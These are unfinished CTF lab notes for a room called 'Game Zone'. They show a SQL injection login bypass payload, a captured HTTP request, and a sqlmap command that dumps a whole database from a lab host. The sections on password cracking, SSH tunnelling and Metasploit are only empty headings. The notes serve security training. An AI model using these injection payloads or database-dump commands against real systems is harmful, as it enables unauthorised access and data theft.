# Game Zone
* Exploit SQLi manually and using SQLMap, crack users hashed password, us SSH tunnelling to reveal a hidden service, and use Metasploit payloads to gain root privileges.

## Obtain access via SQLi
* Taget host uses `SELECT * FROM users WHERE username = :username AND password := password` SQL query within login form.
* Manipulate query to login without legitimate credentials.
  * Username = ' or 1=1 -- -
  * Password = blank
* Changes SQL query to `SELECT * FROM users WHERE username =' or 1=1 -- - AND password := password`.
  * "1=1" = true.
  * "-- -" comments out remainder of query.
## Use SQLMap
* SQLMap is popular OSS for automatic SQL injection and database takeover tool.
* Pre-installed on Kali.
* Can be installed from [here](https://github.com/sqlmapproject/sqlmap).
### Use SQLMap to dump entire database
1. Intercept request to game review search feature using BurpSuite.
2. Save request into text file.
```
POST /portal.php HTTP/1.1
Host: 10.10.72.152
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.72.152
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.72.152/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=9h551ujsnetbpkpeam2fsr2ki2
Connection: close

searchitem=test
```
* Pass request into SQLMap to use authenticated user session.
```
sqlmap -r request.txt --dbms=mysql --dump
```
  * `-r` uses intercepted request.
  * `--dbms` tells SQLMap the type of DBMS.
  * `--dump` attempts to output entire database.

## Crack Password with JohnTheRipper
* 
## Expose Services with Reverse SSH Tunnels

## Privilege Escalation with Metasploit
